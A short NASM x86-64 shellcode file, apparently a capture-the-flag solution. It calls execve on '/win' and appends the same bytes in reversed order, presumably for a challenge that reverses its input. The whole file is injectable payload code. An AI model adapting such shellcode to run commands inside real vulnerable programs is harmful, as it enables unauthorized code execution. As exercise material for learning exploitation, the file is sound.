[BITS 64]
lea rdi, [rel win]
mov al,59
syscall

win:
db "/win",0

db 0x6e,0x69,0x77,0x2f,0x05,0x0f,0x3b,0xb0,0x00,0x00,0x00,0x04,0x3d,0x8d,0x48
